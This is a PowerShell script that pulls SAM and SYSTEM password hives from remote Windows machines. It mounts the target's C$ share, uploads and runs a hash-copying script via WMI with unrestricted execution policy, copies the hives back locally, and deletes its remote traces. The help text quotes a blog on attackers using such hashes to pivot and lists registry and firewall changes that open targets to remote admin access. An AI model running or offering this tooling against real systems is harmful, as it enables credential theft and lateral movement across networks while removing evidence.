<#
 
    .SYNOPSIS
        Powershell script to copy SAM and SYSTEM hives the easy way. Works on local and remote computers
        Script tests for privileges, prompts if not adequate, copies ps1 file remotely, creates directories, executes script, copies files locally, removes remote directoriy (c:\tmp\sam), erases remote files, removes network drive all with progress indicator.

    .DESCRIPTION
        GetRemoteSAM is a function that uses GetPasswordFile on remote computers and copies results locally after wich they are removed remotelly.
        GetPasswordFile is a function that utilizes Copy-RawItem (http://gallery.technet.microsoft.com/scriptcenter/Copy-RawItem-Private-NET-78917643) and the volume shadow copy service to copy the password (either ntds.dit or sam) and system file to a specified directory. This is a safe way of recovering these files in order to conduct password hash analysis with other tools.
        
        From http://blogs.technet.com/b/heyscriptingguy/archive/2013/07/12/using-the-windows-api-and-copy-rawitem-to-access-sensitive-password-files.aspx by Chris Campbell (aka ObscureSec). "Matt Graeber thoroughly discussed how to use Windows PowerShell to interact with the Windows API, and he wrote the example Copy-RawItem function. This function copies files by using DeviceObject paths, which is not supported by built-in cmdlets. Let’s use the function to demonstrate why the reflection method is so useful to security researchers, incident handlers, and unfortunately, hackers. In most cases, the reflection method of interacting with the Windows API requires more code and headache. Why would anyone use it? Matt briefly mentioned that it helps minimize the forensic footprint of the script, but what does that mean and why is it important? Maintaining a minimal footprint is important to an attacker and to an incident handler. Attackers want to remain undetected by antivirus software, avoid leaving evidence of their presence in logs, and avoid leaving other forensic artifacts. For example, the Add-Type method of interacting with the Windows API calls the C# compiler (csc.exe) and leaves several files on the disk that could be discovered. Conversely, incident handlers need to avoid alerting the attacker to their presence and corrupting potential evidence. Both sides are concerned with maintaining a minimal footprint. Now that we know why, let’s look at a common problem and how we can use the aforementioned function to help solve it. After attackers compromise a system, they may want to pivot to other systems by utilizing the user names and passwords located on the box. Those passwords may be used on other machines, and the attacker could potentially use WMI, PsExec, or a remote desktop to gain access to other enterprise machines and (potentially) to critical business data. In the case of a domain controller, the attacker has access to every user name and associated password hash within the domain. Or maybe you know that an attacker has changed a local account’s password, and you want to use that as a signature to detect that attacker’s presence on other machines. Either way, the safest way of gaining access to the hashes is to utilize the Volume Shadow Copy service to access the password database files. There are many other ways, but most of them involve methods that are dangerous to the stability of the system. The earliest reference to this method comes from Using Shadow Copies to Steal the SAM. However, recovering the password hashes from the files is beyond the scope of this post. Password hashes are stored in the SAM file for most computers running Windows, and in the NTDS.DIT file for domain controllers. Both of these files are protected system files, which are locked and can’t be accessed even with full “nt authority\system” privileges..."

    .PARAMETER  strComputer
        GetRemoteSAM.ps1 %hostname%
		GetRemoteSAM.ps1 fqdn.dns.name
		GetRemoteSAM.ps1 ip.add.re.ss

    .EXAMPLE
		GetRemoteSAM.ps1 computername
		
    .INPUTS
        Can be a local or remote machine dns name or ip address.

    .OUTPUTS
        This tool outputs SAM and SYSTEM files to c:\tmp

    .NOTES
        Local System Requirements:
        # Get-PasswordFile.ps1 from http://gallery.technet.microsoft.com/scriptcenter/Get-PasswordFile-4bee091d
        # or from https://github.com/obscuresec/PowerShell/blob/master/Get-PasswordFile.
        # Add the following to the end of the downloaded file 
        #    Get-PasswordFile "c:\tmp\sam"
        # Have drive K: available or change accordingly.
        # Change line 65 to reflect your environment ($Filesource = "YOURPATH\Get-PasswordFile.ps1")      
        
        Optional:
        # For use with variable input replace first line after this help with:
        #     $strComputer =  $args[0]   
        
        Remote System must meet minimum requirements. 
		# If not a domain member then perform the following on the remote system to allow admin privileges - http://support.microsoft.com/kb/942817
		#    cmd /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
		# If needed add exceptions to the firewall
		#    netsh firewall set service type=remoteadmin mode=enable
		#    netsh advfirewall firewall set rule service RemoteAdmin enable (?)
		#    netsh advfirewall firewall set rule group="windows management instrumentation (wmi)" new enable=yes (?)

    .LINK
		https://github.com/obscuresec/PowerShell/blob/master/Get-PasswordFile
		http://blogs.technet.com/b/heyscriptingguy/archive/2013/07/12/using-the-windows-api-and-copy-rawitem-to-access-sensitive-password-files.aspx
		http://gallery.technet.microsoft.com/scriptcenter/Copy-RawItem-Reflection-38fae6d4
		http://gallery.technet.microsoft.com/scriptcenter/Get-PasswordFile-4bee091d
	
    .COMPONENT
        SAM and SYSTEM hives copy using registry and VSS

    .ROLE
        Admin privileges are required to execute this script.
 
#>

$strComputer = "ipaddress/hostname/inputvar"

# User Variables
    $Filesource = "YOURPATH\Get-PasswordFile.ps1"

# Script Variables 
    $destination = "\\" + $strComputer + "\c$"
    $destDrv = "K:\"
    $SAMFile = "K:\tmp\sam\sam"
    $SysFile = "K:\tmp\sam\system"
    $LocalDst = "c:\tmp\sam-"+$strComputer
    $ErrorActionPreference = "SilentlyContinue"
    $Error.Clear()
    $ErrorCode = $null
    $myErr = $False

function WaitForFile($File) {
 # Needed to wait for file copy completion
     while(!(Test-Path $File)) {
      Start-Sleep -s 1;
     }
}

try
{
    write-host "Attempting dangerous operation"
    # Simple test to see if current credentials are sufficient
    $content = get-wmiobject -ErrorAction Stop -list "StdRegProv" -namespace root\default -computername $strComputer 2> $NULL
}
catch [system.exception]
{
    write-host "Caught an exception type: $($_.Exception.GetType().FullName)" -ForegroundColor Red
    write-host "Exception Message: $($_.Exception.Message)" -ForegroundColor Red
    write-host "Prompting for credentials to have another go" -ForegroundColor Green

        # CheckPoint Variable
        $myErr = $True
        $cred = $null
        $strUser = $null
        $mUser = $null 
        $cred = Get-Credential 
}

finally
{
        #needed to get this apart from catch as i wasnt getting able to use my checkpoint variable
        $networkCred = $cred.GetNetworkCredential()
        $strUser = $networkCred.UserName
        $mUser = "|"+$strUser
        $FinalUser = $mUser.substring(1)
        if ($mUser -eq "|"){write-host "Exiting. No credentials were submited." -ForegroundColor Red;Exit}else{$myErr=$False}
        $Error.Clear()
        # Just a test to see if the input credentials have necessary privileges or else bail out
        $content = get-wmiobject -ErrorAction Stop -list "StdRegProv" -namespace root\default -computername $strComputer -Credential $cred 2> $NULL
         
         if ($myErr -ne $True)
         {
                # Progress indicator
                Write-Progress -Activity "Checking path " -status "$strComputer local directories " -percentComplete 10

                # See if remote path is available
                $tmpDrv = Test-Path -PathType Container $destDrv
                # Mount network drive K:. Had to replace string \ from original declarated variable with escape char \.
                if ($tmpDrv -ne $True){net use ($destDrv -replace "\\","") $destination $networkCred.Password /USER:$strUser | Out-Null}
                
                #Create remote directories and copy ps1 file
                $tmpDir = Test-Path -PathType Container $destDrv"tmp"
                $tmpDirSam = Test-Path -PathType Container $destDrv"tmp\sam"
                $tmpPS1File = Test-Path -PathType Container $destDrv"Get-PasswordFile.ps1"
                if ($tmpDir -ne $True){New-Item -ItemType directory -Path  $destDrv"tmp" | Out-Null;$createdbyus=$true}
                if ($tmpDirSam -ne $True){New-Item -ItemType directory -Path  $destDrv"tmp\sam" | Out-Null}
                
                # Progress indicator
                Write-Progress -Activity "Copying ps1 file " -status "$Filesource " -percentComplete 20

                if ($tmpPS1File -ne $True){cmd /c copy $Filesource $destDrv"Get-PasswordFile.ps1" | Out-Null  }
                #Copy-Item $Filesource $destination"\"

                # Progress indicator
                Write-Progress -Activity "Executing ps1 file remotelly " -status "powershell -executionpolicy unrestricted -file c:\Get-PasswordFile.ps1" -percentComplete 30
                $process = get-wmiobject -query "SELECT * FROM Meta_Class WHERE __Class = 'Win32_Process'" -namespace "root\cimv2" -computername $strComputer -credential $cred
                $results = $process.Create( "powershell -executionpolicy unrestricted -file c:\Get-PasswordFile.ps1" )

                $TmpDstDir = Test-Path -PathType Container $LocalDst 
                if ($TmpDstDir -ne $True){New-Item -ItemType directory -Path $LocalDst | Out-Null}

                #Wait for file to exist
                WaitForFile($SAMFile)

                # Progress indicator
                Write-Progress -Activity "Copying file" -status "$SAMFile " -percentComplete 50
                Copy-Item $SAMFile $LocalDst
                # Progress indicator
                Write-Progress -Activity "Copying file" -status "$SysFile " -percentComplete 80
                Copy-Item $SysFile $LocalDst
        
                # Progress indicator
                Write-Progress -Activity "Removing remote files and directories" -status "k:\tmp\sam" -percentComplete 90
                Start-Sleep -Seconds 1

                # Removing ps1 file
                del $destDrv"Get-PasswordFile.ps1"
                if ($createdbyus -eq $True)
                {
                # Removing directory
                    cmd /c rmdir /S /Q $destDrv"tmp\sam"
                }
                else
                {
                # Removing directory
                    cmd /c rmdir /S /Q $destDrv"tmp\sam"
                }
                # Removing share and network drive
                net use k: /DELETE /y | Out-Null
                
                # Progress indicator
                Write-Progress -Activity "Done" -status "SAM Files stored locally at $LocalDst " -percentComplete 100
                Start-Sleep -Seconds 2

            write-host "Files and folders have been removed. Drive k: has been dismounted." -ForegroundColor Green
            write-host "Remote SAM and SYSTEM files are available at "$LocalDst -ForegroundColor Green
        }
}
